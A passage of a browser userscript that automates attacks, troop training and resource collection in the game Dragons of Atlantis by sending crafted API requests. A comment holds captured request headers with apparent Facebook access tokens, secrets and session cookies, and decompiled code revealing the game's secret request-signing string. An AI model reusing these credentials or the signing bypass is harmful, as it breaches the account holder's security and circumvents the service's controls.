    var m = '<DIV class=pbTitle>'+translate( 'Auto-attack Camp Levels' )+'</div><TABLE id=pbatTargTab class=pbTab><TR class=pbTabHdr2><TD>'+translate( 'Dist' )+'</td><TD>'+translate( 'Coords' )+'</td><TD>'+translate( 'Level' )+'</td><TD width=65>'+translate( 'Last Attack' )+'</td></tr>';
//logit (inspect (Data.targets.camps, 5, 1));
    
    var camps = t.getActiveCampList();    
    for (var i=0; i<camps.length; i++){
      m += '<TR><TD>'+ camps[i].dist +'</td><TD align=center>'+ camps[i].x +','+ camps[i].y +'</td><TD align=center>'+ camps[i].lvl +'</td>\
        <TD><span id=pbatList_'+ i +'> --- </span></td><TD><INPUT id=pbattargAN_'+ i +' type=submit value="'+translate('Attack Now')+'"\></td></tr>';
    }
    document.getElementById('pbatmContent').innerHTML = m + '</table>';
    for (var i=0; i<camps.length; i++)
      document.getElementById('pbattargAN_'+ i).addEventListener ('click', butAttackNow, false);
    
    tick();
    
    function butAttackNow (e){
      var args = e.target.id.split('_');
      var dial = new ModalDialog (t.cont, 300, 150, '', false);
      dial.getContentDiv().innerHTML = translate('Sending Attack');
      t.checkAttack (camps[args[1]], notify);
      function notify (rslt){
        if (rslt!=null){
          dial.getContentDiv().innerHTML = '<B>'+ rslt +'</b>';
          dial.allowClose (true);
        } else {
          dial.getContentDiv().innerHTML = '<B>OK</b>';
          setTimeout (function(){dial.destroy()}, 1000);
        }
      }
    }
    
    function tick (){
      var now = serverTime();
      var ts;
      clearTimeout (timer);
      if (!document.getElementById('pbatTargTab'))
        return;
      for (var i=0; i<camps.length; i++){
        if (!camps[i].last)
          ts = '---';
        else {
          var time = now-camps[i].last;
// fix this :P
          if (time > 3600)
            ts = '<FONT COLOR=#FF0000><B>'+ timestr (now-camps[i].last, false) +'</b></font>';
          else
            ts = timestr (now-camps[i].last, false);
        }
        document.getElementById('pbatList_'+ i).innerHTML = ts;
      }
      timer = setTimeout (tick, 5000);
    }
  },

  
  scanMap : function (radius, notify){
    var t = Tabs.AutoAttack;
    Data.targets = {radius:0, center:{x:Seed.s.cities[0].x, y:Seed.s.cities[0].y}, camps:[]};
    var dial = new ModalDialog (t.cont, 300, 165, '', false, null);
    dial.getContentDiv().innerHTML = 'Harita Guncelleniyor..\' 35 "mill"<BR>Arasi Kordinatlar yukleniyor bu islem birkac dk. surebilir.'; // TODO: Translate
    var ix=0; iy=0;
    var x = Seed.s.cities[0].x;
    var y = Seed.s.cities[0].y;
    Map.scanMapCirc (x,y, radius, callback, false);
    function callback (dat){
      if (dat==null){
        dial.getContentDiv().innerHTML = '<B>Ops, c\'e\' stato un errore durante la scannerizzazione della mappa<BR>Ricarica la pagina.</b>'; // TODO: Translate
        dial.allowClose (true);
        if (notify)
          notify (false);
        return;
      }
      for (var i=0; i<dat.tiles.length; i++){
        var tile = dat.tiles[i];
        if (tile.type == 'A')
          Data.targets.camps.push ({x:tile.x, y:tile.y, dist:tile.dist, lvl:tile.lvl, last:null, fromCity:0});
      }      
      if (dat.done){
logit ('*********  Done Scanning Map ... Total targets: '+ Data.targets.camps.length);      
        Data.targets.camps.sort(function(a,b){return a.dist-b.dist});
        Data.targets.radius = radius;
        if (notify)
          notify(true);
        dial.destroy();
      }
    }
  },    
};

function marchTable (myId){
  var m = '<TABLE class=pbTab>';
  var now = serverTime();
  for (var p in Seed.marches){
    var march = Seed.marches[p];
    var time = march.run_at - now;
    var MTClass = 'pbMarchOther';
    if (march.ownerId == myId)
      MTClass = 'pbMarchMine';
    if (time < 0)
      time = '?';
    else if (isNaN (time))
      time = '---';
    else
      time = timestr(time, true);
    m += '<TR class='+ MTClass +'><TD>'+translate( 'Attack' )+' '+ march.x +','+ march.y +'</td><TD>('+ translate( march.target ) +'-'+ march.terrain_level +')</td><TD>'+ translate( march.status ) +'<TD>'+ time +'</td></tr>';
  }
  return m +'</table>';
}

function getAvailableGeneral (){
  for (var p in Seed.generals)
    if (!Seed.generals[p].busy)
      return Seed.generals[p];
  return null;
}
function getMusterPointSlots (cityIdx){
  var lvl = Buildings.getLevel (cityIdx, 'MusterPoint');
  if (!lvl)
    return 0;
  return lvl - Seed.numMarches;
}
function objAddTo (o, name, val){
  if (!o[name])
    o[name] = val;
  else
    o[name] += val;
}




var Buildings = {
  getList : function (cityIdx, type){
    var ret = [];
    for (var i=0; i<Seed.s.cities[cityIdx].buildings.length; i++){
      if (Seed.s.cities[cityIdx].buildings[i].type == type)
        ret.push (Seed.s.cities[cityIdx].buildings[i]);
    }
    return ret;
  },
  getLevel : function (cityIdx, type){
    var x = Buildings.getList(cityIdx, type);
    if (x.length < 1)
      return null;
    return x[0].level;
  },
  getById : function (cityIdx, bid){
    for (var i=0; i<Seed.s.cities[cityIdx].buildings.length; i++){
      if (Seed.s.cities[cityIdx].buildings[i].id == bid)
        return (Seed.s.cities[cityIdx].buildings[i]);
    }
    return null;
  },
}



var Ajax = {
  // cat: 'all, 'reports', ''
  messageList : function (cat, nrpage, callback){
    if (!cat)
      cat = 'all';
    var npage = (nrpage==-1?1:nrpage);
new MyAjaxRequest ('reports.json', { 'user%5Fid':C.attrs.user_id, 'dragon%5Fheart':C.attrs.dragon_heart, count:12, timestamp:parseInt(serverTime()), '%5Fsession%5Fid':C.attrs.session_id, category:cat, page:npage, version:12 }, mycb, false);
    function mycb (rslt){
      if (rslt.ok && rslt.dat.result.success){
        if (nrpage==-1 && callback)
          callback (rslt.dat.result.total);
        else if (callback)
          callback (rslt.dat.result.report_notifications);
      } else if (callback)
        callback (null);
    }
  },
  
  messageDetail : function (id, callback){
    new MyAjaxRequest ('reports/'+ id +'.json', { 'user%5Fid':C.attrs.user_id, timestamp:parseInt(serverTime()), '%5Fsession%5Fid':C.attrs.session_id, version:12, 'dragon%5Fheart':C.attrs.dragon_heart }, mycb, false);
    function mycb (rslt){
      if (rslt.ok && rslt.dat.result.success){
        if (callback)
          callback (rslt.dat.result);
      } else if (callback)
        callback (null);
    }
  },

  messageDelete : function (ids, callback){
    var p = {}
		p['user%5Fid'] = C.attrs.user_id;
 	        p['%5Fmethod'] = 'delete';
                p['timestamp'] = parseInt(serverTime());
 	        p['%5Fsession%5Fid'] = C.attrs.session_id;
                p['ids'] = ids.join('%7C');
                p['dragon%5Fheart'] = C.attrs.dragon_heart;
		p['version'] = 11;
	new MyAjaxRequest ('reports/bulk_delete.json', p, mycb, true); function mycb (rslt){
      if (rslt.ok && !rslt.dat.result.success)
        rslt.ok = false;
      if (callback)
        callback (rslt.ok);
    }
  },

  buildingUpgrade : function (cityId, buildingId, callback){
    var t = Ajax;
    var p = {};
        p['user%5Fid'] = C.attrs.user_id;
        p['dragon%5Fheart'] = C.attrs.dragon_heart; 
        p['%5Fsession%5Fid'] = C.attrs.session_id;
	p['%5Fmethod'] = 'put';
	p['version'] = 11;
        p['timestamp'] = parseInt(serverTime());
    new MyAjaxRequest ('cities/'+ cityId +'/buildings/'+ buildingId +'.json', p, mycb, true);
    function mycb (rslt){
//logit ("BUILD RESPONSE:\n" + inspect (rslt, 10, 1));
      if (rslt.dat.result.success){
        Seed.jsonAddJob (rslt.dat.result.job);
      } else {
        rslt.ok = false;
        rslt.errmsg = rslt.dat.result.errors[0];
      }
      if (callback)
        callback (rslt);
    }
 },

  troopTraining : function (troopType, troopQty, cityId, callback){
    var t = Ajax;
    var p = {};
        p['user%5Fid'] = C.attrs.user_id;
	p['%5Fmethod'] = 'post';
	p['timestamp'] = parseInt(serverTime());
        p['%5Fsession%5Fid'] = C.attrs.session_id;
        p['units%5Bquantity%5D'] = troopQty;
        p['units%5Bunit%5Ftype%5D'] = troopType;
        p['dragon%5Fheart'] = C.attrs.dragon_heart;
	p['version'] = 11;
	new MyAjaxRequest ('cities/'+ cityId +'/units.json', p, mycb, true);
    function mycb (rslt){
//logit ("BUILD RESPONSE:\n" + inspect (rslt, 10, 1));
      if (rslt.dat.result.success){
        Seed.jsonAddJob (rslt.dat.result.job);
      } else {
        rslt.ok = false;
        rslt.errmsg = rslt.dat.result.errors[0];
      }
      if (callback)
        callback (rslt);
    }
 },
 
/***
Headers: 
  Referer: http://castlemania-production.s3.amazonaws.com/flash/game/current/castlemania.swf?api%5Fserver=http%3A%2F%2Frealm57%2Ec6%2Ecastle%2Ewonderhill%2Ecom%2Fapi&pub%5Fserver=pub%2Ecastle%2Ewonderhill%2Ecom&rev=924319190&primary%5Fui%5Fcachebreaker=1306544367&pub%5Fport=7000&session%5Fid=x&secondary%5Fui%5Fcachebreaker=1306544367&facebook%5Fid=1400526627&s3%5Fserver=http%3A%2F%2Fcastlemania%2Dproduction%2Es3%2Eamazonaws%2Ecom&locale=en&s3%5Fswf%5Fprefix=%2Fflash%2Fgame%2Fcurrent&sound%5Fcachebreaker=1306544367&building%5Fcachebreaker=1306544367&lazy%5Floaded%5Fswf%5Fcachebreaker=1306547039&cachebreaker=1306544367 
  Content-type: application/x-www-form-urlencoded 
  X-S3-AWS: a8de6d65d1282ce0700947a13b02a25e3b75705d 
  Content-length: 195 

march[x]=380&
_session_id=x&
march[march_type]=attack&
march[y]=4&
timestamp=1306561014&
march[units]={"BattleDragon":5555}&
march[general_id]=39140&
_method=post

**********  ACTUAL   **************************

http://realm57.c6.castle.wonderhill.com/api/cities/400085311/marches.json

====Request Headers====
Host    realm57.c6.castle.wonderhill.com
User-Agent    Mozilla/5.0 (Windows; U; Windows NT 5.2; en-US; rv:1.9.2.17) Gecko/20110420 Firefox/3.6.17
Accept    text/html,application/xhtml+xml,application/xml;q=0.9;q=0.8
Accept-Language    en-us,en;q=0.5
Accept-Encoding    gzip,deflate
Accept-Charset    ISO-8859-1,utf-8;q=0.7,*;q=0.7
Keep-Alive    115
Connection    keep-alive
Cookie    __utma=54346615.351709906.1306454674.1306594599.1306600260.18; __utmz=54346615.1306600260.18.18.utmcsr=apps.facebook.com|utmccn=(referral)|utmcTıp=referral|utmcct=/dragonsofatlantis/; fbs_111896392174831="access_token=111896392174831%7C2.AQCLIBbA7kKLMuHy.3600.1306605600.1-1400526627%7CdBYEObDO5XAfWdt_1EotXStmCls&base_domain=wonderhill.com&expires=1306605600&secret=AQCdR0PcwY6F3d2b&session_key=2.AQCLIBbA7kKLMuHy.3600.1306605600.1-1400526627&sig=afb7aa8d9443291b9ea6a27b7ff2ad38&uid=1400526627"; __utmc=54346615; castle=x; base_domain_90f6f4a7485b79a9d34aa0d73e237651=wonderhill.com; 90f6f4a7485b79a9d34aa0d73e237651=0dcaf98b237cf22f15062e5aa22087f0; 90f6f4a7485b79a9d34aa0d73e237651_user=1400526627; 90f6f4a7485b79a9d34aa0d73e237651_ss=98EerRToMFdI79rynviS4w__; 90f6f4a7485b79a9d34aa0d73e237651_session_key=2.9PYlq_6lBk9H_E7wnGQZyg__.3600.1304622000.1-1400526627; 90f6f4a7485b79a9d34aa0d73e237651_expires=0; __utmb=54346615.1.10.1306600260

=== POST ====
Referer: http://castlemania-production.s3.amazonaws.com/flash/game/current/castlemania.swf?api%5Fserver=http%3A%2F%2Frealm57%2Ec6%2Ecastle%2Ewonderhill%2Ecom%2Fapi&pub%5Fserver=pub%2Ecastle%2Ewonderhill%2Ecom&rev=249479844&primary%5Fui%5Fcachebreaker=1306544367&pub%5Fport=7000&session%5Fid=x&secondary%5Fui%5Fcachebreaker=1306544367&facebook%5Fid=1400526627&s3%5Fserver=http%3A%2F%2Fcastlemania%2Dproduction%2Es3%2Eamazonaws%2Ecom&locale=en&s3%5Fswf%5Fprefix=%2Fflash%2Fgame%2Fcurrent&sound%5Fcachebreaker=1306544367&building%5Fcachebreaker=1306544367&lazy%5Floaded%5Fswf%5Fcachebreaker=1306547039&cachebreaker=1306544367 
Content-type: application/x-www-form-urlencoded 
X-S3-AWS: 068e6b0f5457527c31445b690c59abd1684c0ef9 
Content-length: 195 
march%5Bmarch%5Ftype%5D=attack&%5Fsession%5Fid=xÃ—tamp=1306600718&march%5Bunits%5D=%7B%22BattleDragon%22%3A8888%7D&%5Fmethod=post&march%5Bgeneral%5Fid%5D=69795&march%5Bx%5D=380&march%5By%5D=4

**********************************************

var header:URLRequestHeader; 
if (this._queue.length > 0 && this._currentRequest == null) { 
  this._currentRequest = this._queue.shift(); 
  postParams = new URLVariables(); 
  var _loc_2:int = 0; 
  var _loc_3:* = this._currentRequest.params; 
  while (_loc_3 in _loc_2) { 
    key = _loc_3[_loc_2]; 
    value = this._currentRequest.params[key]; 
    if (getQualifiedClassName(value) == "Array") { 
      arr = value as Array; 
      value = arr.join(","); 
    } 
    postParams[key] = value; 
  } 
  this._request.url = this._currentRequest.url; 
  this._request.data = postParams; 
  str = "playerId" + this._request.url + this._request.data + "WaterDragon5555"; 
  sig = this.generateSHA(str); 
  this._request.method = this._currentRequest.postMethod ? (URLRequestMethod.POST) : (URLRequestMethod.GET); 
  if (this._currentRequest.postMethod) { 
    header = new URLRequestHeader("X-S3-AWS", sig); 
    this._request.requestHeaders.push(header); 
  } try { 
    this._loader.load(this._request); 
  } catch (error:Error) { 
    trace("RequestDelegate[ERROR]: Unable to load requested document."); 
  } 
} return; 
}// end function 



***/

  marchBusy : 0,
  march : function (cityId, x, y, genId, units, ownerId, callback){
    var t = Ajax;
    var p = {};
    ++t.marchBusy;
	p['user%5Fid'] = C.attrs.user_id;
	p['march%5Bmarch%5Ftype%5D'] = 'attack';
	p['%5Fsession%5Fid'] = C.attrs.session_id;
	p['dragon%5Fheart'] = C.attrs.dragon_heart;
	p['march%5Bx%5D'] = x;
	p['march%5Bgeneral%5Fid%5D'] = genId;
	p['march%5By%5D'] = y;
	p['%5Fmethod'] = 'post';
    var u = {}
	var MT = false;
	var sendTroops = "%7B";
    for (var pu in units)
      if (units[pu] > 0){
        u[pu] = units[pu];
    if (MT == true )
            sendTroops += "%2C";
    sendTroops += "%22" + pu + "%22%3A" + units[pu];
    MT = true;
	}
	sendTroops += "%7D";
	p['march%5Bunits%5D'] = sendTroops; //JSON2.stringify(u); //ie: '{"Longbowman":500}';
	p['timestamp'] = parseInt(serverTime());
	p['version'] = 11;
	new MyAjaxRequest ('cities/'+ cityId +'/marches.json', p, mycb, true);
    function mycb (rslt){
//logit ("MARCH RESPONSE:\n" + inspect (rslt, 10, 1));
      --t.marchBusy;
      if (rslt.ok)
      {
        if (rslt.dat.errors!=undefined && rslt.dat.errors.lenght!=0)
        {
          rslt.ok = false;
          rslt.errmsg = rslt.dat.errors[0];
        }
      }
      else
      {
        rslt.ok = false;
        if (matTypeof(rslt.dat.result.errors) == 'array')
          rslt.errmsg = rslt.dat.result.errors[0];
        else 
          rslt.errmsg = rslt.dat.result.errors;
      }
      if (rslt.ok)
      {
        if (rslt.dat.result.success){
//  logit ('March ID: '+ rslt.dat.result.job.march_id);  
          try {
            Seed.jsonGotCity (rslt.dat.result);
            Seed.marches[rslt.dat.result.job.march_id].ownerId = ownerId;          
          } catch (e){
            WinLog.write ('***********'+ e);
         }
        }
      }      
      if (callback)
        callback (rslt);
    }
  },

  marchRecall : function (cityId, marchId, callback){ // untested
    var t = Ajax;
    var p = {};
        p['user%5Fid'] = C.attrs.user_id;
	p['dragon%5Fheart'] = C.attrs.dragon_heart;
	p['%5Fsession%5Fid'] = C.attrs.session_id;
        p['%5Fmethod'] = 'delete';
	p['version'] = 11;
	p['timestamp'] = parseInt(serverTime());
    new MyAjaxRequest ('cities/'+ cityId +'/marches/'+ marchId +'.json', p, mycb, true);
    function mycb (rslt){
//logit ("MARCH RESPONSE:\n" + inspect (rslt, 10, 1));
      if (rslt.ok){
        if (rslt.dat.result.success){
logit (inspect (rslt, 9, 1));        
//          Seed.jsonGotCity (rslt.dat.result);
        } else {
          rslt.ok = false;
          rslt.errmsg = rslt.dat.result.errors[0];
        }
      }      
      if (callback)
        callback (rslt);
    }
  },

  collectResources : function (cityId, callback){
	var p = {};
	p['user%5Fid'] = C.attrs.user_id;
	p['timestamp'] = parseInt(serverTime());
	p['%5Fsession%5Fid'] = C.attrs.session_id;
	p['version'] = 11;
	p['dragon%5Fheart'] = C.attrs.dragon_heart;
   new MyAjaxRequest ('cities/'+ cityId +'/move_resources.json', p, mycb, true);
    function mycb (rslt){
      if (rslt.ok){
        Seed.jsonGotCity (rslt.dat);
      }
      if (callback)
        callback (rslt.ok);
    }
  },
}

var AutoCollect = {
  init : function (){
    var t = AutoCollect;
	
	// Set defaults if not already done
		if(!Data.options.autoCollect.enabled)
			Data.options.autoCollect.enabled = false;
		if(!Data.options.autoCollect.lastTime)
			Data.options.autoCollect.lastTime = 0;
		if(!Data.options.autoCollect.delay)
			Data.options.autoCollect.delay = 8;
		if(!Data.options.autoCollect.unit)
			Data.options.autoCollect.unit = 3600;
    
	t.setEnable (Data.options.autoCollect.enabled);
  },
  setEnable : function (onOff){
    var t = AutoCollect;
    clearTimeout (t.timer);
    Data.options.autoCollect.enabled = onOff;
    if (onOff){
      var time = (Data.options.autoCollect.delay*Data.options.autoCollect.unit) - serverTime() + Data.options.autoCollect.lastTime;
      if (time <= 0)
        t.doit ();
      else
        t.timer = setTimeout (t.doit, time*1000);
    }
  },
  doit : function (){
    var t = AutoCollect;
    Data.options.autoCollect.lastTime = serverTime();
    for (var out=1; out<Seed.s.cities.length; out++)
      collect (out, out*30000);
    t.timer = setTimeout (t.doit, ((Data.options.autoCollect.delay*Data.options.autoCollect.unit) + (Math.random()*120))*1000);
    function collect (cityIdx, delay){
      setTimeout (function(){
        Ajax.collectResources (Seed.s.cities[cityIdx].id);
        actionLog ('Risorse ritirate dall\'avamposto #'+ cityIdx); // TODO: Translate
      }, delay);
    }
  },
}



/***************************************************************************************************************/
Tabs.Info = {
  tabOrder : INFO_TAB_ORDER,
  tabLabel : gInfo,
  tabDisabled : false,
  cont : null,
  timer : null,
  sndFoodTimes : 0,
  sndAlarMTimes : 0,
  
  init : function (div){
    var t = Tabs.Info;
    t.cont = div;
    t.sndFoodTimes = 0;
    t.sndAlarMTimes = 0;
    div.innerHTML = '<DIV class=pbTitle>TGE Tools (v. '+ Version +')<BR>'+ WebSite +'<BR>'+ Ideatore +'</div>\
  <TABLE width=100%><TR><TD><INPUT type=submit value="'+translate( 'Yenile' )+'" id=pbinfRefresh></input><INPUT id=pcReloadTools type=submit value="'+translate( 'Sayfayi Yenile' )+'" \><TD align=left></td><TD align=right></span><SPAN id=Giornata></span><SPAN id=pbinfGMT><SPAN id=pbinfGMT></td></tr></table><DIV id=pbinfCont></div>';
    document.getElementById('pbinfRefresh').addEventListener ('click', t.refresh, false);
    document.getElementById('pcReloadTools').addEventListener ('click', reloadTools, false);
    
    t.showStuff();
  },

  show : function (){
    var t = Tabs.Info;
    t.showStuff();
  },
  hide : function (){
    var t = Tabs.Info;
    clearTimeout (t.timer);
  },

  showStuff : function (){
    var t = Tabs.Info;
    clearTimeout (t.timer);
//logit (inspect (Seed.s, 8, 1));
    
    var city = Seed.s.cities[0];
    var m = cityTitle(0);
    //if (Seed.numMarches == 0)
      Seed.fetchCity (city.id);
    
    if (Seed.firstTime)
    {
      m += '<TABLE style="margin-top:3px; border-none" width=100%><TR><TD width=25%><B>'+translate( 'Malzemeler' )+':</b></td>';
      m += '<TD width=6% align=right>'+translate( 'Altin' )+':'+'</td><TD style="padding-right:5px" width=19% align=right>'+addCommasInt(Seed.resources.gold)+'</td>';
      m += '<TD width=6% align=right>'+translate( 'Cevher' )+':'+'</td><TD style="padding-right:5px" width=19% align=right>'+addCommasInt(Seed.resources.ore)+'</td>';
      m += '<TD width=6% align=right>'+translate( 'Tas' )+':'+'</td><TD style="padding-right:5px" width=19% align=right>'+addCommasInt(Seed.resources.stone)+'</td></tr>';
      m += '<TD width=25%></td>';
      m += '<TD width=6% align=right>'+translate( 'Kereste' )+':'+'</td><TD style="padding-right:5px" width=19% align=right>'+addCommasInt(Seed.resources.wood)+'</td>';
      m += '<TD width=6% align=right>'+translate( 'Yemek' )+':'+'</td><TD style="padding-right:5px" width=19% align=right>'+addCommasInt(Seed.resources.food)+'</td>';
      m += '<TD colspan=2 style="padding-right:5px" width=25% align=left>';
      if (Seed.ratefood < 0)
      {
        var remainingSeconds = Seed.resources.food * 3600 / -Seed.ratefood;
        var alarm = (remainingSeconds <= Data.options.warningFood.delay*Data.options.warningFood.unit) ? true : false;
        if (Data.options.warningFood.enabled)
        {
          m += '<SPAN class=';
          if (alarm)
            m += 'boldRed';
          else
            m += 'normalGreen';
          m += '>';
        }
        m += '('+timestr(remainingSeconds, true)+')';
        if (Data.options.warningFood.enabled)
          m += '</span>';
        if (Data.options.warningFood.enabled && alarm && Data.options.warningFood.sound)
        {
          t.sndFoodTimes++;
          if (t.sndFoodTimes==1)
            m +='<span id="dummy"><iframe src="http://dc93.4shared.com/img/48576375/1cb40c86/dlink__2Fdownload_2F9p0Aoyid_3Ftsid_3D20110508-194828-34f9fd7e/preview.mp3" height="0" width="0"></iframe></span>';
          else if (t.sndFoodTimes>2)
            t.sndFoodTimes = 0;
        }
      }
      m += '</td></tr></table>';
    }
    else
    {
      if (Seed.resources.gold != 0 || Seed.resources.ore != 0 || Seed.resources.stone != 0 || Seed.resources.wood != 0 || Seed.resources.food != 0)
        Seed.firstTime = true;
    }
    m += '<TABLE style="margin-top:3px" width=100%>\
      <TR bgcolor=#dde align=center><TD style="border-right: 1px solid; border-bottom: 1px solid;"><B>'+translate( 'BIRIMLER' )+'</b></td><TD style="border-bottom: 1px solid; padding-left:7px"><B>'+translate( 'GENERALLER' )+'</b></td></tr>\
      <TR valign=top align=center><TD width=50% style="border-right: 1px solid;">';
    // TRUPPE
    m += '<TABLE class=pbTabPad>';
    ink = '';
    for (var i=0; i<Names.troops.names.length; i++){
      var name = Names.troops.names[i][1];
      if (name=='GreatDragon' || name=='WaterDragon' || name=='StoneDragon' || name=='FireDragon')
        continue;
      var num = city.units[name];
      if (!num)
        num = 0;
      var marchNum = 0;
      for (p in city.marches)
      for (q in city.marches[p].units)
      if (q == name)
      marchNum += city.marches[p].units[q];
      var marchStr = (marchNum > 0) ? '<B>(' + marchNum + ')</b>' : '';
      m += '<TR><TD class=pbTabLeft>'+translate(name) +':</td><TD align=right>'+ num +'</td><TD align=right>'+ marchStr +'</td></tr>'; 
      ink += translate(name)+':'+num+';';
    }
    m += '</table></td><TD width=50% style=" padding-left:7px">';
    // GENERALI
    m += '<TABLE class=pbTabPad>';
    for (var ig=0; ig<city.generals.length; ig++){
    if (Seed.numMarches)
    for (pm in Seed.marches)
 // The general object will be null if the march is a transport
  if (Seed.marches[pm].march_type != "Transport")
  try {
  if (city.generals[ig].name == Seed.marches[pm].general.first_name)
  loc = Seed.marches[pm].x + ',' + Seed.marches[pm].y;
  }
  catch (e) {
  actionLog('Err: general first_name not available' + e.name + ' ' + e.message);
  }
  m += '<TR><TD class=pbTabLeft>'+ city.generals[ig].name +' ('+ city.generals[ig].rank +')</td><TD width=75%><SPAN class=boldGreen>'+ (city.generals[ig].busy?' <SPAN class=boldRed>'+translate( 'BUSY' )+'</span>':'')+' - '+(city.generals[ig].busy?loc:'')+'</td></tr>';
  } 
      m += '</table></td></tr></table>';
      var attacchi = 0;
      var spiate = 0;
      if (Data.options.warningTower.enabled && Data.msgsTower.length != 0)
      {
        for (var i=0;i<Data.msgsTower.length;i++)
        {
          if (attacchi<2 && Data.msgsTower[i].type==0)
            attacchi++;
          if (Data.options.warningTower.nospy)
          {
            if (attacchi>1)
              break;
          }
          else
          {
            if (spiate<2 && Data.msgsTower[i].type==1)
              spiate++;
            if (attacchi>1 && spiate>1)
              break;
          }
        }
      }

      if (attacchi+spiate>0)
      {
        m += '<TABLE><TR><TD width=100%><SPAN class=boldRed>';
        if (attacchi==0)
        {
          if (spiate==1)
            m += translate ( 'There\'s a tip-off in progress' );
          else
            m += translate ( 'There\'re tip-off in progress' );
        }        
        else if (attacchi==1)
        {
          if (spiate==0)
            m += translate ( 'There\'s an attack in progress' );
          else if (spiate == 1)
            m += translate ( 'There\'re an attack and a tip-off in progress' );
          else
            m += translate ( 'There\'re tip-off and an attack in progress' );
        }
        else
        {
          if (spiate==0)
            m += translate ( 'There\'re attacks in progress' );
          else if (spiate == 1)
            m += translate ( 'There\'re attacks and a tip-off in progress' );
          else
            m += translate ( 'There\'re attacks and tip-off in progress' );
        }
        if (attacchi+spiate>0 && Data.options.warningTower.sound)
        {
          t.sndAlarMTimes++;
          if (t.sndAlarMTimes==1)
            m +='<span id="dummy"><iframe src="http://koc.god-like.info/alarm.html" height="0" width="0"></iframe></span>';
          else if (t.sndAlarMTimes>2)
            t.sndAlarMTimes = 0;
        }
        m += '</span></td></tr></table>';
      }
      else
        m += '<BR>';
      m += '<TABLE class=pbTabPad><TR><TD class=pbTabLeft>'+translate( 'Marches' )
          +': </td><TD>'+ Seed.numMarches +'</td></tr>'
          + dispBuildingJob(0) + dispResearchJob(0) + dispTrainingJobs(0) + '</td></tr></table>';
  
    // outposts ...
    if (Seed.s.cities.length > 0){
      for (var i=1; i<Seed.s.cities.length; i++){
        m += '<DIV class=short></div>'+ cityTitle(i) + '<TABLE class=pbTabPad>'
          + dispBuildingJob(i) + dispTrainingJobs(i) + '</td></tr></table>';
      }
    }
     
    document.getElementById('pbinfCont').innerHTML = m; 
    var now = new Date();	
    now.setTime(now.getTime() + (now.getTimezoneOffset()*60));
    document.getElementById('pbinfGMT').innerHTML = '<b>'+now.toTimeString().substring (0,8) + '</b>';
    t.timer = setTimeout (t.showStuff, 1000);  
    var oggi = new Date();  
    var ora = oggi.getHours();  
    document.getElementById('Giornata').innerHTML ='<b>' +(ora>12?ora<18?"GMT Saati  ":"GMT Saati  ":"GMT Saati  ")+ '</b>'; // TODO: Translate
    
    function dispBuildingJob (cityIdx){
      var m = '';
      var job = getBuildingJob (cityIdx);
// TODO: very rare occurance: Error: job.building is null
      if (job)
         m += '<TR><TD class=pbTabLeft>'+translate( 'Insaat' )+':</td><TD>'+ translate(job.building.type) +' '+translate( 'level' )+' '+ job.job.level +'</td><TD>'+ timestr(job.job.run_at - serverTime(), true) +'</td></tr>';
      else
        m += '<TD colspan=2><b>'+translate( 'Insaat' )+':</b> <SPAN class=boldRed>'+translate( 'No' )+'</span></td></tr>';
      return m;
    }
    function dispResearchJob (cityIdx){
      var m = '';
      var job = getResearchJob (cityIdx);
      if (job)
       m += '<TR><TD class=pbTabLeft>'+translate( 'Arastirma' )+':</td><TD>'+ translate(job.research_type) +' '+translate( 'level' )+' '+ job.level +'</td><TD>'+ timestr(job.run_at - serverTime(), true) +'</td></tr>';
      else
        m += '<TD colspan=2><b>'+translate( 'Arastirma' )+':</b> <SPAN class=boldRed>'+translate( 'No' )+'</span></td></tr>';
      return m;
    }
    function dispTrainingJobs (cityIdx){
      var m = '';
      var last = serverTime();
      var trains = [];
      for (var i=0; i<Seed.s.cities[cityIdx].jobs.length; i++)
        if (Seed.s.cities[cityIdx].jobs[i].queue=='units' && Seed.s.cities[cityIdx].jobs[i].unit_type)
          trains.push (Seed.s.cities[cityIdx].jobs[i]);
      for (var i=0; i<trains.length; i++){
        var left='', tot='';
        if (i==0)
          left = translate( 'Egitiliyor' )+':';
        else if (i==trains.length-1)
          tot = '   <B>('+ timestrShort(trains[i].run_at-serverTime()) +')</b>';
        m += '<TR><TD class=pbTabLeft>'+ left +'</td><TD>'+ trains[i].quantity +' '+ translate( trains[i].unit_type ) +' </td><TD> '
          + timestr(trains[i].run_at-last, true) + tot + '</td></tr>';
        last = trains[i].run_at;
      }      
      return m;
    }
	
    function cityTitle (cityIdx){
      var city = Seed.s.cities[cityIdx];
      // Si suppone che gli avamposti siano sempre in difesa
      var wallStatus = '';
	  var alliance_name = (Seed.s.alliance) ? Seed.s.alliance.name : '';
      if (cityIdx == 0)
      wallStatus = (Seed.s.cities[cityIdx].defended) ? '<font class="defending">Truppe in DIFESA</font>' : '<font class="hiding">Askerler Saklaniyor</font>'; // TODO: Translate
      else
      wallStatus = '<font class="defending">Askerler Savunmada</font>'; // TODO: Translate
      return '<div class=pbSubtitle><TABLE width="100%" class=pbTab><TR><TD align=left>'+ translate(city.name) +'</td><TD align=center>'+ city.x +','+ city.y +'</td><TD align=center width=200px><font color=FFCCCC>' + alliance_name +'</font></td><TD align=right>'+ wallStatus +'</td></tr></table></div>'; 
    }
  },
    refresh : function (){
    var t = Tabs.Info;
    Seed.fetchSeed (t.showStuff());  
  },
}

/****
function getBuildingJob (cityIdx){
  for (var i=0; i<Seed.s.cities[cityIdx].jobs.length; i++){
    var job = Seed.s.cities[cityIdx].jobs[i];
    if (job.queue == 'building')
      return ({job:job, building:Buildings.getById(cityIdx, job.city_building_id)});
  }
  return null;
}
function getResearchJob (cityIdx){
  for (var i=0; i<Seed.s.cities[cityIdx].jobs.length; i++){
    var job = Seed.s.cities[cityIdx].jobs[i];
    if (job.queue == 'research')
      return (job);
  }
  return null;
}
****/
function getBuildingJob (cityIdx){
  var cid = Seed.s.cities[cityIdx].id;
  for (var p in Seed.jobs[cid]){
    var job = Seed.jobs[cid][p];
    if (job.queue == 'building')
      return ({job:job, building:Buildings.getById(cityIdx, job.city_building_id)});
  }
  return null;
}

function getResearchJob (cityIdx){
  var cid = Seed.s.cities[cityIdx].id;
  for (var p in Seed.jobs[cid]){
    var job = Seed.jobs[cid][p];
    if (job.queue == 'research')
      return (job);
  }
  return null;
}


function cloneProps (src) {
  var newObj = (src instanceof Array) ? [] : {};
  for (i in src) {
    if (matTypeof(src[i]) == 'function')
      continue;
    if (src[i] && typeof src[i] == 'object') {
      newObj[i] = cloneProps(src[i]);
    } else 
      newObj[i] = src[i];
  } 
  return newObj;
};


var Names = {
  troops : {
    'names' : [
    [0, 'Porter','Hamal'],
    [1, 'Conscript', 'Acemi ER'],
    [2, 'Spy', 'Casus'],
